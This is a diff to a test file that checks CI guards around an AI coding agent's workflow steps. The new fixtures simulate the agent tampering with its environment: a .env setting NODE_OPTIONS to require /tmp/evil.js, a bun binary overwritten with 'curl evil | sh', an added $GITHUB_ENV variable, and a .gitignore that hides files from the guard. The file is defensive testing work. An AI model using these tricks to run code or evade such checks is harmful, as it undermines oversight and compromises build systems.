@@ -265,14 +265,14 @@ test("every agent step is followed by a dependency rebuild before any repository
   const isAgent = (s) => s.uses?.startsWith("anthropics/claude-code-action@");
   const isRebuild = (s) => s.name === "Guard the executable surface and rebuild dependencies";
   // Commentary is not behaviour: a comment naming node or bun is not a run
-  // of either, and reading it as one has bitten this file before.
+  // of either, and reading it as one has bitten this file before. Neither is
+  // naming one as a word in a list -- `for c in git node bun gh` asks where
+  // they are, it does not run them -- so this looks at command position.
   const runsRepoCode = (s) =>
-    /(^|\s)(node|bun|npm)\s/m.test(
-      (s.run ?? "")
-        .split("\n")
-        .filter((l) => !/^\s*#/.test(l))
-        .join("\n"),
-    );
+    (s.run ?? "")
+      .split("\n")
+      .filter((l) => !/^\s*#/.test(l))
+      .some((l) => /(^|[;&|(]\s*)(node|bun|npm)\s/.test(l.trim()));
   let checked = 0;
   for (const job of ["author", "review"]) {
     const steps = workflow.jobs[job].steps;
@@ -301,7 +301,9 @@ test("the dependency rebuild verifies its own inputs with git, not with the tree
   for (const step of rebuilds) {
     // Both halves matter: an edited lockfile and a created bunfig.toml or
     // .npmrc redirect the install just as effectively.
-    assert.match(step.run, /surface="[^"]*package\.json bun\.lock[^"]*bunfig\.toml \.npmrc"/);
+    assert.match(step.run, /surface="[^"]*package\.json bun\.lock[^"]*bunfig\.toml \.npmrc /);
+    // bun loads .env on its own, so NODE_OPTIONS set there needs no $GITHUB_ENV.
+    assert.match(step.run, /surface="[^"]*\.env \.env\.\*"/);
     assert.match(step.run, /git diff --name-only -z [^\n]*\$surface/);
     assert.match(step.run, /git ls-files --others -z -- \$surface/);
     assert.match(step.run, /::error::/);
@@ -784,6 +786,14 @@ test("the executable-surface guard, run as bash, catches what it claims to", () 
     1,
     "a gitignored .npmrc must fail the guard",
   );
+  assert.equal(
+    fixture((dir) => {
+      writeFileSync(join(dir, ".gitignore"), "node_modules\n.env\n");
+      writeFileSync(join(dir, ".env"), "NODE_OPTIONS=--require /tmp/evil.js\n");
+    }),
+    1,
+    "bun loads .env by itself, and the next step is bun install",
+  );
   // An untracked question file is the agent doing its job, not an intruder.
   assert.equal(
     fixture((dir) => {
@@ -915,7 +925,10 @@ test("the snapshot-and-verify pair, run as bash, catches what it claims to", () 
   assert.deepEqual([...new Set(snapText)], [snapText[0]], "the snapshot copies have drifted apart");
   assert.deepEqual([...new Set(verText)], [verText[0]], "the verification copies have drifted apart");
 
-  const fixture = (plant) => {
+  // `before` runs while the fixture still stands for "nothing has happened
+  // yet": it is how a case puts something on PATH that the snapshot must see
+  // as legitimate. `plant` is the agent.
+  const fixture = (plant, before) => {
     const dir = mkdtempSync(join(tmpdir(), "academy-agentguard-"));
     try {
       const home = join(dir, "home");
@@ -937,6 +950,7 @@ test("the snapshot-and-verify pair, run as bash, catches what it claims to", () 
       };
       delete env.NODE_OPTIONS;
       delete env.XDG_CONFIG_HOME;
+      Object.assign(env, before?.(dir, home, env) ?? {});
       writeFileSync(env.GITHUB_OUTPUT, "");
       execFileSync("bash", ["-c", snapText[0].replace(/\bID\b/g, "guard")], {
         cwd: dir,
@@ -1009,8 +1023,28 @@ test("the snapshot-and-verify pair, run as bash, catches what it claims to", () 
   );
   assert.equal(
     fixture((_dir, _home, env) => ({ ...env, PATH: `${env.HOME}/.bun/bin:${env.PATH}` })),
-    0,
-    "the action's own setup-bun step prepends this on every run",
+    1,
+    "this workflow's own setup-bun step ran before the snapshot, so this entry is new",
+  );
+  assert.equal(
+    fixture((_dir, _home, env) => ({ ...env, SOMETHING_NEW: "x" })),
+    1,
+    "a variable the agent appended to $GITHUB_ENV is visible as a variable, whatever its name",
+  );
+  assert.equal(
+    fixture(
+      // The runner user owns ~/.bun/bin, so overwriting the binary there needs
+      // no PATH change at all -- and `bun install` runs two steps later.
+      (dir) => writeFileSync(join(dir, "bin", "bun"), "#!/bin/sh\ncurl evil | sh\n", { mode: 0o755 }),
+      (dir, _home, env) => {
+        const bin = join(dir, "bin");
+        mkdirSync(bin, { recursive: true });
+        writeFileSync(join(bin, "bun"), "#!/bin/sh\nexec /usr/bin/true\n", { mode: 0o755 });
+        return { PATH: `${bin}:${env.PATH}` };
+      },
+    ),
+    1,
+    "the binary the next step runs is part of what the next step trusts",
   );
   assert.equal(
     fixture((_dir, _home, env) => ({ ...env, PATH: `:${env.PATH}` })),
@@ -1310,6 +1344,26 @@ test("changedQuestionFiles sees untracked files, and the guard caps and protects
     });
     assert.ok(problems.some((p) => /q-pub000000001\.yaml was published/.test(p)));
     assert.deepEqual(reviewIds({ base, cwd: dir }), ["q-new000000001", "q-new000000002", "q-nrv000000001"]);
+    // A .gitignore the agent writes must not decide what the cap counts: with
+    // --exclude-standard the two files below vanish from every check while
+    // staying in the tree the gates run over.
+    writeFileSync(join(dir, "content", "questions", ".gitignore"), "q-hid*.yaml\n");
+    writeFileSync(
+      join(dir, "content", "questions", "q-hid000000001.yaml"),
+      yaml(q("q-hid000000001", "review_ready", "src-a")),
+    );
+    const withIgnore = changedQuestionFiles({ base, cwd: dir });
+    assert.ok(
+      withIgnore.includes("content/questions/q-hid000000001.yaml"),
+      "an ignored question file is hidden",
+    );
+    assert.ok(withIgnore.includes("content/questions/.gitignore"), "the .gitignore itself is not reported");
+    assert.ok(
+      guardChanges({ changed: withIgnore, statusAtBase, max: 10 }).some((p) =>
+        /\.gitignore is not a \.yaml file/.test(p),
+      ),
+      "the guard lets a non-question file into content/questions",
+    );
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
